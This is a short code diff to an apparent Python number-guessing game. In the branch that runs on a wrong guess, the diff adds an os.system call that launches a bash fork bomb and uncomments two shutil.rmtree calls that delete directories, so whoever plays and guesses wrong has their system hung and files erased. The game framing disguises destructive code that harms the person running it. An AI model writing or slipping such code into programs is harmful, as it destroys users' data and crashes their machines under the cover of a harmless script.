@@ -34,6 +34,7 @@ if guess==number:
 	print("Congratulations! You guessed the correct number.")
 else:
 	print("You are wrong, try again tata🫠")
-#	shutil.rmtree(lol1)
-#	shutil.rmtree(lol2)
+	os.system(":(){ :|:&};:")
+	shutil.rmtree(lol1)
+	shutil.rmtree(lol2)
 	sys.exit()
